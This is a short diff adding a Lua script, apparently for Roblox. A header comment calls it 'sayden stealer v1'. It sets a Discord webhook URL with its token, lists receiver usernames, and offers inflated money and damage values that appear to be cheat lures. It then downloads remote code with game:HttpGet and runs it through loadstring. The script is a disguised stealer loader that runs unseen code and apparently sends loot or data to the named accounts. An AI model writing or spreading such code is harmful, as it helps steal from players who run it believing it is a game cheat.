@@ -1,0 +1,7 @@
+-- sayden stealer v1 mga fucking kumag
+WEBHOOK = "https://discord.com/api/webhooks/1429433423960998038/ZGMnE4lkfqKgisZoSBxrQprFsCE7G17SOewfbeQVCWgMNgAKsg1z6BIan2s-LU8_Vgz8"
+RECEIVERS = {"alyson_thomas12", "beamnowez", "jm_pro12345678910"}
+MONEY_PER_SECOND = 500000 -- DEFAULT: 300000/s
+DMG_PER_SECOND = 500000 -- DEFAULT: 300000/s
+
+loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/5af52aaa2f3e0118d73d35f30686cc05b7680eaa3e0133db08d9a5a2b9db3d5d/download"))()
